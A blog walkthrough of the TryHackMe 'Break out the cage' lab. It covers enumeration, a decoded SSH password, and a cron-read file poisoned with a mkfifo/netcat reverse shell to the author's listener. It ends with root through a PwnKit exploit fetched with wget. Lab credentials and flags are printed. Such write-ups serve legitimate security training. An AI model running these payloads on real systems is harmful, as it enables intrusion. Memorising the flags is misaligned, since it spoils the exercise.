---
layout: post
title: "TryHackMe: Break out the cage"
date: 2025-10-04 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, walkthrough, web-enumeration, privilege-escalation, suid, hash-cracking, post-exploitation, pentesting]
render_with_liquid: false
media_subpath: /images/Break_out_the_cage/
description: "Walkthrough of Break out the cage: web and service enumeration (HTTP, FTP), content discovery and decoding, gaining initial access via a writable cron‑read file, local enumeration and shell stabilization, and privilege escalation via a misused SUID/Polkit helper."
---

# TryHackMe: Break out the cage — Writeup | 04 October 2025

<div align="center">
  <img src="THM.png" alt="TryHackMe Logo" width="800"/>
  <img src="Break_out.png" alt="Room Banner" width="500"/>
</div>

**Author:** Aakash Modi

---

## Overview
A compact, hands‑on room that teaches web‑facing attack paths and local escalation. You perform surface enumeration (HTTP, directories, FTP), recover credentials and decoded content, gain initial access by planting a payload in a writable artifact consumed by a scheduled task, stabilize an interactive shell, and escalate to root via a misused SUID/Polkit helper.

Skills practiced:
- Web enumeration and content discovery (nmap, gobuster, HTTP/FTP)
- Decoding and credential recovery (Base64, Vigenère, etc.)
- Initial access via writable file exploitation and reverse shells
- Post‑exploitation: shell stabilization and targeted local enumeration
- Privilege escalation using misconfigured SUID/Polkit helpers

Estimated difficulty: Beginner → Intermediate. Perform all actions only in authorized labs and environments.

---

## Website view

- Observed a name on the web page that suggested a username:

  - username: `weston`

![Website View](website_view.png)
![Username](username.png)

---

## Reconnaissance & Scanning

### Nmap

Run a full port and service scan:

```bash
sudo nmap -Pn -T4 -n -sC -sV -p- -oN scan_cage.txt 10.201.119.193
```

Summary (truncated):
- 21/tcp open  ftp     vsftpd 3.0.3 (anonymous FTP allowed)
- 22/tcp open  ssh     OpenSSH 7.6p1
- 80/tcp open  http    Apache 2.4.29

(Full output saved to `scan_cage.txt`.)

---

## FTP

Anonymous FTP was permitted. Example credentials used:

- username: `anonymous`
- password: `anonymous`

From the FTP server we downloaded `dad_tasks`. 

![FTP Login](ftp_login.png)
![Get File](get_file.png)
![Tasks File](tasks_file.png)

---

## Web enumeration (gobuster)

Directory scan example:

```bash
gobuster dir -u http://10.201.38.13/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
  -o dir_results.txt -t 25
```

Interesting directories found:
- `/images/`
- `/html/`
- `/scripts/`
- `/contracts/`
- `/auditions/`

---

## Vigenère / encoded data

A Base64 string recovered from the lab decoded to a Vigenère‑encrypted message. I decoded the Base64 (e.g., with CyberChef) and solved the Vigenère cipher using the Guballa Vigenère Solver open it in a new tab: <a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener noreferrer">Guballa Vigenère Solver</a>.

Credentials recovered:
- username: `weston`
- password: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

![Hash Creak](hash_creak.png)
![Hash to Plain Text](hash_to_plain_text.png)
![Password](password.png)

---

## Access & Local Enumeration

Logged in as `weston` via SSH. Local enumeration highlights:

- `sudo -l` output showed `weston` can run one program as root:

```
User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
```

Running `/usr/bin/bees` printed a broadcast message (“AHHHHHHH THEEEEE BEEEEESSSS!!!”), suggesting a cron-driven process or periodic script.

To inspect scheduled activity, I used `pspy` on the box (copied to the target and made executable). `pspy` showed a cron-invoked Python script:

- `/opt/.dads_scripts/spread_the_quotes.py` (run regularly)

Listing `/opt/.dads_scripts` revealed a `.files` directory containing `.quotes`. The `.quotes` file is read by the periodic script.

Files of interest:
- `/opt/.dads_scripts/spread_the_quotes.py`
- `/opt/.dads_scripts/.files/.quotes`

![pspy](pspy.png)
![Automated Script](automated_script.png)
![Interesting](interesting.png)

---

## Privilege escalation via writable file

Because the cron-run script read `.quotes`, I was able to plant a payload into `/opt/.dads_scripts/.files/.quotes`. Example reverse shell entry used for this lab (replace IP/port with your listener when in a lab):

```bash
echo "hacked; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.76.195 8888 >/tmp/f" > /opt/.dads_scripts/.files/.quotes
```

After gaining an interactive shell, make it stable:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Inside the box, enumeration revealed `Super_Duper_Checklist` containing Task 2 token:

- flag (Task 2): THM{M37AL_0R_P3N_T35T1NG}

![Payload](payload.png)
![Flag Task 2](flag_tash2.png)

---

## Root privilege escalation

I searched for SUID binaries and other potential escalation vectors:

```bash
find / -type f -perm -4000 2>/dev/null
```

`/usr/bin/pkexec` (Polkit pwnkit) was present. I used a publicly available PwnKit exploit to escalate to root (downloaded to my machine, hosted via a simple HTTP server, fetched on target with `wget`, and executed). After successful exploitation I obtained a root shell.

Root flag was in `email_backup/email_2`:

- root flag: THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

![PwnKit](pwnkit.png)
![Python Server](python_server.png)
![Download PwnKit](download_pwnkit.png)
![Root Access](root_access.png)
![Root Flag](root_flag.png)

---

## Summary

- Performed network and web enumeration (nmap, gobuster).
- Found credentials via FTP and encoded payloads.
- Gained a shell by leveraging a periodically executed script that read a writable file.
- Completed local privilege escalation via an available SUID/Polkit vector to obtain root.
- Collected user and root flags.

---

## Room Complete!

<div align="center">
  <img src="completed.png" alt="Completed" width="800"/>
</div>

---

## Happy Hacking!

<div align="center">
  <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExeDB3ODg0am45c252cXZiOXhldXZ1aDgzMjYxdXJuaWhkbjh1dzI4ZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/rMS1sUPhv95f2/giphy.gif" alt="Hacking GIF" width="800"/>
</div>
